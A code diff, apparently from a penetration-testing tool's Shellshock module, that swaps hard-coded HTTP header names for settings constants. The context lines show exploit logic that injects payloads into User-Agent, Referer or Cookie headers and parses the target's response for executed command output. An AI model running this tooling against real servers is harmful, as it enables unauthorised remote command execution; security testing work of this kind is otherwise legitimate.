@@ -44,9 +44,9 @@ if settings.MULTI_TARGETS or settings.STDIN_PARSING:
 
 # Available HTTP headers
 headers = [
-"User-Agent",
-"Referer",
-"Cookie",
+settings.USER_AGENT,
+settings.REFERER,
+settings.COOKIE,
 ]
 
 # Available Shellshock CVEs
@@ -305,9 +305,9 @@ def shellshock_handler(url, http_request_method, filename):
           print(settings.print_payload(payload))
         header = {check_header : payload}
         request = _urllib.request.Request(url, None, header)
-        if check_header == "Cookie":
+        if check_header == settings.COOKIE:
           menu.options.cookie = payload 
-        if check_header == "User-Agent":
+        if check_header == settings.USER_AGENT:
           menu.options.agent = payload
         log_http_headers.do_check(request)
         log_http_headers.check_http_traffic(request)
@@ -316,9 +316,9 @@ def shellshock_handler(url, http_request_method, filename):
           response = proxy.use_proxy(request)
         else:
           response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
-        if check_header == "Cookie":
+        if check_header == settings.COOKIE:
           menu.options.cookie = default_cookie
-        if check_header == "User-Agent":
+        if check_header == settings.USER_AGENT:
           menu.options.agent = default_user_agent  
         percent = ((i*100)/total)
         float_percent = "{0:.1f}".format(round(((i*100)/(total*1.0)),2))
@@ -553,7 +553,7 @@ def cmd_exec(url, cmd, cve, check_header, filename):
 
       header = {check_header : payload}
       request = _urllib.request.Request(url, None, header)
-      if check_header == "User-Agent":
+      if check_header == settings.USER_AGENT:
         menu.options.agent = payload
       log_http_headers.do_check(request)
       log_http_headers.check_http_traffic(request)
@@ -562,7 +562,7 @@ def cmd_exec(url, cmd, cve, check_header, filename):
         response = proxy.use_proxy(request)
       else:
         response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
-      if check_header == "User-Agent":
+      if check_header == settings.USER_AGENT:
         menu.options.agent = default_user_agent  
       shell = checks.page_encoding(response, action="decode").rstrip().replace('\n',' ')
       shell = re.findall(r"" + TAG + "(.*)" + TAG, shell)
